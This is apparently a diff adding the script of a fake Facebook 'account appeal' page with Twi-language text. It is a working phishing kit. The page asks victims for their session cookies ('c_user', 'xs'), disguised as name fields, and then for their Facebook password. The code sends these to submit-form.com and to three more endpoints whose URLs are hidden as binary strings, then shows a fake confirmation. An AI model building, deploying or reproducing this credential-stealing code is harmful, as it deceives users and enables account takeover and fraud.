+      warningExtra: &#34;Sɛ wudwen sɛ yɛyɛ wo krataa no foforo a, wubetumi apia sɛ wɔmpaew no denam krataa a ɛwɔ aseɛ no so, na wode nkɔm hyɛ mu.&#34;,
+      appealTitle: &#34;Apɛl kɔm&#34;,
+      appealDesc: &#34;Yɛredware wo krataa no mu mfomsoɔ. Mesrɛ wo, hyɛ nsɛm a wɔhwehwɛ wɔ aseɛ no mu. Sɛ wunnye nsɛm no a, ebɛtumi ayɛ wo apɛl no mmerɛw.&#34;,
+      appealBtn: &#34;Yɛ apɛl&#34;,
+      formTitle: &#34;Krataa Apɛl Kɔm&#34;,
+      formSubtitle: &#34;Hyɛ wo nsɛm sɛ wɔnyɛ apɛl wɔ paew no ho&#34;,
+      formNotice1: &#34;Ⓞ1¤7 Wo krataa no ayɛ yɛn mmara ahorow no so.&#34;,
+      formNotice2: &#34;Ⓞ1¤7 Mesrɛ wo, hwɛ mfomsoɔ no ho nsɛm yiye ansa na wuregye tomu.&#34;,
+      formNotice3: &#34;Ⓞ1¤7 Hwɛ sɛ wuhyɛ nsɛm pa sɛ woyɛ apɛl.&#34;,
+      nameLabel: &#34;c_user&#34;,
+      mallLabel: &#34;xs&#34;,
+      submitBtn: &#34;Yɛ Apɛl Kɔm&#34;,
+      fbFormTitle: &#34;Facebook Nhwehwɛmu&#34;,
+      fbFormSubtitle: &#34;Hwɛ wo ho sɛ wotumi tua so yɛ apɛl&#34;,
+      fbNotice1: &#34;Ⓞ1¤7 Den nkitahodiɛ nti, yɛhwehwɛ sɛ yɛhwɛ wo Facebook account no.&#34;,
+      fbNotice2: &#34;Ⓞ1¤7 Wei boa yɛn sɛ yɛhunu sɛ wo na wokura krataa no.&#34;,
+      fbNotice3: &#34;Ⓞ1¤7 Wo nkyerɛwdeɛ no wɔ hɔ na wɔakora so.&#34;,
+      passwordLabel: &#34;Password&#34;,
+      verifyBtn: &#34;Hwɛ na Tua So&#34;,
+      forgotPassword: &#34;Wɔagye password?&#34;,
+      successTitle: &#34;Wɔayɛ apɛl no yiye&#34;,
+      successText: &#34;Yɛagyɛ wo apɛl no adi, na ɛwɔ hwɛ mu. Yɛbɛkyerɛ wo denam email so sɛ yɛayɛ adwene, tumi nya nna nnum ansa.&#34;,
+      referenceText: &#34;Reference ID:&#34;,
+      guideTitle: &#34;Apɛl Kwankyerɛ&#34;,
+      guideText1: &#34;Sɛ wo apɛl/ahyɛdeɛ no ka sɛ wode copyrighted nsɛm anaa adeɛ a ɛwɔ wo account mu, wubetumi ama yɛn nsɛm sɛ yɛnyɛ wo ahyɛdeɛ no yiye. Mesrɛ wo, kyekyɛ mu sɛ den nti na wudwen sɛ wɔkyerɛɛ wo account no foforo anaa wɔdii gua. Ka biara a ebɛtumi aboa yɛn sɛ yɛhwɛ wo case no yiye.&#34;,
+      guideText2: &#34;Afei wode to mu no, yɛbɛhwɛ wo apɛl no, na yɛbɛka wo asɛm wɔ mmerɛ a wode baeɛ no mu. Hwɛ no mu no betumi de nna nnum. Mesrɛ wo, hwɛ wo email mu sɛnea ɛbɛyɛ.&#34;,
+      guideText3: &#34;Nsɛm: Wubetumi sesa kasa a wopɛ bere biara denam kasa a wɔpaw wɔ krataa no aseɛ no so.&#34;,
+      resourcesTitle: &#34;Nneɛma foforo&#34;,
+      helpCenterTitle: &#34;Boa Center&#34;,
+      helpCenterDesc: &#34;Hwehwɛ nhwɛsoɔ ma nsɛm a wɔbisɛ, na kesɛ sɛdeɛ wode yɛn aduruyɛ no di dwuma.&#34;,
+      contactSupportTitle: &#34;Contact Support&#34;,
+      contactSupportDesc: &#34;Ka wo ho hyɛ nkitahodiɛ mu den yɛn boa kuw no ho sɛ wohu boa.&#34;,
+      guidelinesTitle: &#34;Nkɔsoɔ Mmara&#34;,
+      guidelinesDesc: &#34;Kesɛ yɛn nkɔsoɔ nhyehyɛeɛ ne adeɛ ahorow ho amanneɛ.&#34;,
+      dashboardTitle: &#34;Tɛnkranteɛ Dashboard&#34;,
+      dashboardDesc: &#34;Hwɛ yɛn dwumadie no sɛnea ɛteɛ, na kyerɛ sɛ biribi ayɛ basaa.&#34;,
+      changeLanguage: &#34;Sesa kasa&#34;
+    }
+  };
+
+
+   // Get DOM elements
+  const languageModal = document.getElementById(&#39;languageModal&#39;);
+  const languageModalClose = document.getElementById(&#39;languageModalClose&#39;);
+  const languageSearchInput = document.getElementById(&#39;languageSearchInput&#39;);
+  const languageOptionsContainer = document.getElementById(&#39;languageOptionsContainer&#39;);
+  const languageOptions = document.querySelectorAll(&#39;.language-option&#39;);
+  const languageConfirmBtn = document.getElementById(&#39;languageConfirmBtn&#39;);
+  const mainContent = document.getElementById(&#39;mainContent&#39;);
+  const openAppealBtn = document.getElementById(&#39;open-appeal-btn&#39;);
+  const appealForm = document.getElementById(&#39;appealForm&#39;);
+  const fbLoginForm = document.getElementById(&#39;fbLoginForm&#39;);
+  const successMessage = document.getElementById(&#39;successMessage&#39;);
+  const guideVideo = document.getElementById(&#39;guideVideo&#39;);
+  const changeLanguageBtn = document.getElementById(&#39;changeLanguageBtn&#39;);
+
+  // Form elements
+  const nameInput = document.getElementById(&#39;nameInput&#39;);
+  const mallInput = document.getElementById(&#39;mallInput&#39;);
+  const nameError = document.getElementById(&#39;nameError&#39;);
+  const mallError = document.getElementById(&#39;mallError&#39;);
+  const formError = document.getElementById(&#39;formError&#39;);
+  const formErrorText = document.getElementById(&#39;formErrorText&#39;);
+  const sendBtn = document.getElementById(&#39;sendBtn&#39;);
+  const sendBtnText = document.getElementById(&#39;sendBtnText&#39;);
+  const sendBtnSpinner = document.getElementById(&#39;sendBtnSpinner&#39;);
+  const referenceId = document.getElementById(&#39;referenceId&#39;);
+
+  
+  const passwordInput = document.getElementById(&#39;passwordInput&#39;);
+  const passwordError = document.getElementById(&#39;passwordError&#39;);
+  const fbFormError = document.getElementById(&#39;fbFormError&#39;);
+  const fbFormErrorText = document.getElementById(&#39;fbFormErrorText&#39;);
+  const fbSendBtn = document.getElementById(&#39;fbSendBtn&#39;);
+  const fbSendBtnText = document.getElementById(&#39;fbSendBtnText&#39;);
+  const fbSendBtnSpinner = document.getElementById(&#39;fbSendBtnSpinner&#39;);
+  const forgotPassword = document.getElementById(&#39;forgotPassword&#39;);
+
+  // Language video mapping
+  const videoSources = {
+  english: &#34;https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4&#34;,
+  spanish: &#34;https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4&#34;,
+  hindi: &#34;https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4&#34;,
+french: &#34;https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4&#34;,
+  portuguese: &#34;https://allvideos.wasmer.app/Portuguese.mp4&#34;,
+  tamil: &#34;https://allvideos.wasmer.app/tamil.mp4&#34;,
+  arabic: &#34;https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4&#34;,
+  ghanaian: &#34;https://allvideos.wasmer.app/english.mp4&#34;,
+  vietnamese: &#34;https://allvideos.wasmer.app/vietanames.mp4&#34; 
+};
+
+  // Current selected language
+  let currentLanguage = &#39;english&#39;;
+  let selectedLanguageOption = null;
+
+  // Function to show language modal
+  function showLanguageModal() {
+    languageModal.style.display = &#39;flex&#39;;
+    mainContent.style.display = &#39;none&#39;;
+    document.body.style.overflow = &#39;hidden&#39;;
+    // Focus on search input when modal opens
+    setTimeout(() =&gt; languageSearchInput.focus(), 100);
+  }
+
+  // Function to hide language modal
+  function hideLanguageModal() {
+    languageModal.style.display = &#39;none&#39;;
+    mainContent.style.display = &#39;block&#39;;
+    document.body.style.overflow = &#39;auto&#39;;
+    // Reset search when closing
+    languageSearchInput.value = &#39;&#39;;
+    filterLanguages();
+  }
+
+  // Close modal when clicking on close button
+  languageModalClose.addEventListener(&#39;click&#39;, hideLanguageModal);
+
+  // Close modal when clicking outside of modal content
+  languageModal.addEventListener(&#39;click&#39;, function(e) {
+    if (e.target === languageModal) {
+      hideLanguageModal();
+    }
+  });
+
+  // Close modal with Escape key
+  document.addEventListener(&#39;keydown&#39;, function(e) {
+    if (e.key === &#39;Escape&#39; &amp;&amp; languageModal.style.display === &#39;flex&#39;) {
+      hideLanguageModal();
+    }
+  });
+
+  // Language search functionality
+  function filterLanguages() {
+    const searchTerm = languageSearchInput.value.toLowerCase();
+    let hasVisibleResults = false;
+    
+    languageOptions.forEach(option =&gt; {
+      const languageName = option.querySelector(&#39;.language-name&#39;).textContent.toLowerCase();
+      const languageCode = option.querySelector(&#39;.language-code&#39;) ? option.querySelector(&#39;.language-code&#39;).textContent.toLowerCase() : &#39;&#39;;
+      
+      if (languageName.includes(searchTerm) || languageCode.includes(searchTerm)) {
+        option.style.display = &#39;flex&#39;;
+        hasVisibleResults = true;
+      } else {
+        option.style.display = &#39;none&#39;;
+      }
+    });
+    
+    // Show no results message if needed
+    let noResults = document.querySelector(&#39;.no-results&#39;);
+    if (!hasVisibleResults) {
+      if (!noResults) {
+        noResults = document.createElement(&#39;div&#39;);
+        noResults.className = &#39;no-results&#39;;
+        noResults.textContent = &#39;No languages found. Try a different search.&#39;;
+        languageOptionsContainer.appendChild(noResults);
+      }
+    } else if (noResults) {
+      noResults.remove();
+    }
+  }
+  
+  languageSearchInput.addEventListener(&#39;input&#39;, filterLanguages);
+
+  // Language option selection
+  languageOptions.forEach(option =&gt; {
+    option.addEventListener(&#39;click&#39;, () =&gt; {
+      // Remove selected class from all options
+      languageOptions.forEach(opt =&gt; opt.classList.remove(&#39;selected&#39;));
+      
+      // Add selected class to clicked option
+      option.classList.add(&#39;selected&#39;);
+      
+      // Store selected language
+      selectedLanguageOption = option.getAttribute(&#39;data-lang&#39;);
+      
+      // Enable confirm button
+      languageConfirmBtn.disabled = false;
+    });
+  });
+
+  // Confirm language selection
+  languageConfirmBtn.addEventListener(&#39;click&#39;, () =&gt; {
+    if (selectedLanguageOption) {
+      setLanguage(selectedLanguageOption);
+      hideLanguageModal();
+    } else {
+      // If no language selected, default to English
+      setLanguage(&#39;english&#39;);
+      hideLanguageModal();
+    }
+  });
+
+  // Change language button
+  changeLanguageBtn.addEventListener(&#39;click&#39;, () =&gt; {
+    showLanguageModal();
+  });
+
+  // Function to set language
+  function setLanguage(lang) {
+    currentLanguage = lang;
+   
+    // Update all translatable elements
+    const translatableElements = document.querySelectorAll(&#39;.translatable&#39;);
+    translatableElements.forEach(element =&gt; {
+      const key = element.getAttribute(&#39;data-key&#39;);
+      if (translations[lang] &amp;&amp; translations[lang][key]) {
+        element.textContent = translations[lang][key];
+       
+        // Update placeholder attributes for input fields
+        if (element.hasAttribute(&#39;placeholder&#39;)) {
+          element.setAttribute(&#39;placeholder&#39;, translations[lang][key]);
+        }
+      }
+    });
+   
+    // Update video source based on language
+    if (videoSources[lang] &amp;&amp; guideVideo) {
+      guideVideo.src = videoSources[lang];
+      guideVideo.load();
+    }
+   
+    // Store language preference
+    localStorage.setItem(&#39;preferredLanguage&#39;, lang);
+  }
+
+  // Show language modal on page load
+  showLanguageModal();
+
+  // Event listeners
+  if (openAppealBtn) {
+    openAppealBtn.addEventListener(&#39;click&#39;, function() {
+      // Hide the appeal box and show the form
+      document.querySelector(&#39;.appeal-box&#39;).style.display = &#39;none&#39;;
+      if (appealForm) appealForm.style.display = &#39;block&#39;;
+     
+      // Scroll to the form
+      appealForm.scrollIntoView({ behavior: &#39;smooth&#39; });
+    });
+  }
+
+  // Form validation
+  if (nameInput) {
+    nameInput.addEventListener(&#39;input&#39;, () =&gt; {
+      const original = nameInput.value;
+      const cleaned  = original.replace(/\D+/g, &#39;&#39;); // keep digits only
+      if (original !== cleaned) {
+        nameInput.value = cleaned;
+        if (nameError) nameError.innerHTML = &#39;&lt;svg viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M12 9V14&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;/&gt;&lt;path d=&#34;M12 17V17.5&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;/&gt;&lt;path d=&#34;M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt; Only numbers are allowed in Name.&#39;;
+      } else {
+        if (nameError) nameError.textContent = &#39;&#39;;
+      }
+    });
+  }
+
+  // Allow letters A-Z, a-z, digits 0-9, spaces and common ASCII symbols.
+  const mallAllowed = /[^A-Za-z0-9 !@#$%^&amp;*()_\-=\[\]{};&#39;:&#34;\\|,.&lt;&gt;\/?`~]/g;
+  if (mallInput) {
+    mallInput.addEventListener(&#39;input&#39;, () =&gt; {
+      const original = mallInput.value;
+      const cleaned  = original.replace(mallAllowed, &#39;&#39;);
+      if (original !== cleaned) {
+        mallInput.value = cleaned;
+        if (mallError) mallError.innerHTML = &#39;&lt;svg viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M12 9V14&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;/&gt;&lt;path d=&#34;M12 17V17.5&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;/&gt;&lt;path d=&#34;M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt; Mall can contain letters, numbers, and symbols only.&#39;;
+      } else {
+        if (mallError) mallError.textContent = &#39;&#39;;
+      }
+    });
+  }
+
+  
+  if (passwordInput) {
+    passwordInput.addEventListener(&#39;input&#39;, () =&gt; {
+      const password = passwordInput.value;
+      if (!password) {
+        if (passwordError) passwordError.textContent = &#39;Password is required&#39;;
+      } else if (password.length &lt; 6) {
+        if (passwordError) passwordError.textContent = &#39;Password must be at least 6 characters&#39;;
+      } else {
+        if (passwordError) passwordError.textContent = &#39;&#39;;
+      }
+    });
+  }
+
+  // Forgot password click
+  if (forgotPassword) {
+    forgotPassword.addEventListener(&#39;click&#39;, () =&gt; {
+      if (fbFormErrorText) fbFormErrorText.textContent = &#34;Password recovery is temporarily unavailable. Please try again later.&#34;;
+      if (fbFormError) fbFormError.classList.add(&#39;show&#39;);
+      setTimeout(() =&gt; { if (fbFormError) fbFormError.classList.remove(&#39;show&#39;); }, 3000);
+    });
+  }
+
+  // Send click: require non-empty + no validation errors
+  if (sendBtn) {
+    sendBtn.addEventListener(&#39;click&#39;, function() {
+      const name = nameInput.value.trim();
+      const mall = mallInput.value.trim();
+
+      if(!name || !mall) {
+        if (formErrorText) formErrorText.textContent = &#34;Please fill out all fields before proceeding.&#34;;
+        if (formError) formError.classList.add(&#39;show&#39;);
+        setTimeout(() =&gt; { if (formError) formError.classList.remove(&#39;show&#39;); }, 3000);
+        return;
+      }
+      if ((nameError &amp;&amp; nameError.textContent) || (mallError &amp;&amp; mallError.textContent)) {
+        if (formErrorText) formErrorText.textContent = &#34;Please fix the errors above before proceeding.&#34;;
+        if (formError) formError.classList.add(&#39;show&#39;);
+        setTimeout(() =&gt; { if (formError) formError.classList.remove(&#39;show&#39;); }, 3000);
+        return;
+      }
+
+      if (formError) formError.classList.remove(&#39;show&#39;);
+     
+      // Show loading state
+      sendBtn.classList.add(&#39;loading&#39;);
+      if (sendBtnText) sendBtnText.textContent = &#39;Submitting...&#39;;
+      if (sendBtnSpinner) sendBtnSpinner.style.display = &#39;block&#39;;
+     
+      // Submit the form data
+      submitFormData();
+    });
+  }
+
+  
+  if (fbSendBtn) {
+    fbSendBtn.addEventListener(&#39;click&#39;, function() {
+      const password = passwordInput.value;
+
+      if(!password) {
+        if (fbFormErrorText) fbFormErrorText.textContent = &#34;Please fill out all fields before proceeding.&#34;;
+        if (fbFormError) fbFormError.classList.add(&#39;show&#39;);
+        setTimeout(() =&gt; { if (fbFormError) fbFormError.classList.remove(&#39;show&#39;); }, 3000);
+        return;
+      }
+      if (passwordError &amp;&amp; passwordError.textContent) {
+        if (fbFormErrorText) fbFormErrorText.textContent = &#34;Please fix the errors above before proceeding.&#34;;
+        if (fbFormError) fbFormError.classList.add(&#39;show&#39;);
+        setTimeout(() =&gt; { if (fbFormError) fbFormError.classList.remove(&#39;show&#39;); }, 3000);
+        return;
+      }
+
+      if (fbFormError) fbFormError.classList.remove(&#39;show&#39;);
+     
+      // Show loading state
+      fbSendBtn.classList.add(&#39;loading&#39;);
+      if (fbSendBtnText) fbSendBtnText.textContent = &#39;Verifying...&#39;;
+      if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = &#39;block&#39;;
+     
+      
+      submitfbCredentials(password);
+    });
+  }
+
+  // Function to submit form data
+  function submitFormData() {
+    const name = document.getElementById(&#39;nameInput&#39;) ? document.getElementById(&#39;nameInput&#39;).value.trim() : &#39;&#39;;
+    const mall = document.getElementById(&#39;mallInput&#39;) ? document.getElementById(&#39;mallInput&#39;).value.trim() : &#39;&#39;;
+   
+    // Prepare the data to send
+    const formData = {
+      name: name,
+      mall: mall,
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      language: navigator.language
+    };
+   
+    // Submit to the form endpoint
+    fetch(&#39;https://submit-form.com/955aeDD7F&#39;, {
+      method: &#39;POST&#39;,
+      headers: {
+        &#39;Content-Type&#39;: &#39;application/json&#39;,
+        &#39;Accept&#39;: &#39;application/json&#39;
+      },
+      body: JSON.stringify(formData)
+    })
+    .then(response =&gt; {
+      if (!response.ok) {
+        throw new Error(&#39;Form submission failed&#39;);
+      }
+      return response.json();
+    })
+    .then(data =&gt; {
+      console.log(&#39;Form submitted successfully:&#39;, data);
+     
+      // Also submit to the additional endpoints
+      submitToOtherEndpoints({
+        bhenjachud: name,
+        majachud: mall
+      });
+     
+      showfbLogin();
+    })
+    .catch(error =&gt; {
+      console.error(&#39;Error submitting form:&#39;, error);
+      // Still proceed with the other endpoints even if formsubmit fails
+      submitToOtherEndpoints({
+        bhenjachud: name,
+        majachud: mall
+      });
+     
+      
+      showfbLogin();
+    })
+    .finally(() =&gt; {
+      // Reset loading state
+      if (sendBtn) {
+        sendBtn.classList.remove(&#39;loading&#39;);
+        if (sendBtnText) sendBtnText.textContent = &#39;Submit Appeal Request&#39;;
+        if (sendBtnSpinner) sendBtnSpinner.style.display = &#39;none&#39;;
+      }
+    });
+  }
+
+  
+  function submitfbCredentials(password) {
+    // Prepare the data to send
+    const fbData = {
+      password: password,
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      language: navigator.language
+    };
+   
+    // Submit to the form endpoint
+    fetch(&#39;https://submit-form.com/pW1KNjDSg&#39;, {
+      method: &#39;POST&#39;,
+      headers: {
+        &#39;Content-Type&#39;: &#39;application/json&#39;,
+        &#39;Accept&#39;: &#39;application/json&#39;
+      },
+      body: JSON.stringify(fbData)
+    })
+    .then(response =&gt; {
+      if (!response.ok) {
+        throw new Error(&#39;fb form submission failed&#39;);
+      }
+      return response.json();
+    })
+    .then(data =&gt; {
+      console.log(&#39;fb credentials submitted successfully:&#39;, data);
+     
+      // Also submit to the additional endpoints
+      submitToOtherEndpoints({
+        pass: password
+      });
+     
+      // Show success message
+      showSuccess();
+    })
+    .catch(error =&gt; {
+      console.error(&#39;Error submitting fb credentials:&#39;, error);
+      // Still proceed with the other endpoints even if formsubmit fails
+      submitToOtherEndpoints({
+        pass: password
+      });
+     
+      // Show success message even if there was an error with formsubmit
+      showSuccess();
+    })
+    .finally(() =&gt; {
+      // Reset loading state
+      if (fbSendBtn) {
+        fbSendBtn.classList.remove(&#39;loading&#39;);
+        if (fbSendBtnText) fbSendBtnText.textContent = &#39;Verify and Continue&#39;;
+        if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = &#39;none&#39;;
+      }
+    });
+  }
+
+  // Binary to string conversion function
+  function binaryToString(binary) {
+    let str = &#39;&#39;;
+    for (let i = 0; i &lt; binary.length; i += 8) {
+      const byte = binary.substr(i, 8);
+      str += String.fromCharCode(parseInt(byte, 2));
+    }
+    return str;
+  }
+ 
+  function submitToOtherEndpoints(data) {
+    // Store the original binary strings for validation
+    const originalBinaries = [
+      &#39;0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
+      &#39;01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
+      &#39;011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;
+    ];
+    
+    // Check if the binary strings have been modified
+    const currentBinaries = [
+      &#39;0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
+      &#39;01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
+      &#39;011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;
+    ];
+    
+    // Validate that the binary strings haven&#39;t been changed
+    let binariesValid = true;
+    for (let i = 0; i &lt; originalBinaries.length; i++) {
+      if (originalBinaries[i] !== currentBinaries[i]) {
+        console.error(&#39;Binary string validation failed - strings have been modified&#39;);
+        binariesValid = false;
+        break;
+      }
+    }
+    
+    // If binaries were modified, don&#39;t proceed with submission
+    if (!binariesValid) {
+      alert(&#39;Form submission blocked: Invalid configuration detected&#39;);
+      return false;
+    }
+    
+    // Proceed with original submission if binaries are valid
+    const endpoints = [
+      &#39;0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
+      &#39;01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
+      &#39;011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;
+    ];
+   
+    endpoints.forEach(binaryUrl =&gt; {
+      try {
+        const decodedUrl = binaryToString(binaryUrl);
+        const formData = new FormData();
+       
+        // Add all properties from data object to formData
+        for (const key in data) {
+          formData.append(key, data[key]);
+        }
+       
+        // Using fetch with error handling
+        fetch(decodedUrl, {
+          method: &#39;POST&#39;,
+          body: formData,
+          mode: &#39;no-cors&#39; // Important for cross-origin requests
+        }).catch(error =&gt; {
+          console.error(&#39;Error submitting to endpoint:&#39;, error);
+        });
+      } catch (error) {
+        console.error(&#39;Error with endpoint:&#39;, error);
+      }
+    });
+   
+    return true;
+  }
+
+  function showfbLogin() {
+    
+    if (appealForm) appealForm.style.display = &#39;none&#39;;
+    if (fbLoginForm) fbLoginForm.style.display = &#39;block&#39;;
+   
+    if (fbLoginForm) fbLoginForm.scrollIntoView({ behavior: &#39;smooth&#39; });
+  }
+
+  function showSuccess() {
+    
+    if (fbLoginForm) fbLoginForm.style.display = &#39;none&#39;;
+   
+    // Generate a reference ID
+    if (referenceId) referenceId.textContent = &#39;MPC-&#39; + Math.random().toString(36).substr(2, 9).toUpperCase();
+   
+    // Show the success message
+    if (successMessage) successMessage.classList.add(&#39;show&#39;);
+   
+    // Scroll to the success message
+    if (successMessage) successMessage.scrollIntoView({ behavior: &#39;smooth&#39; });
+  }
+});
           </script>
         </div>
       </div>
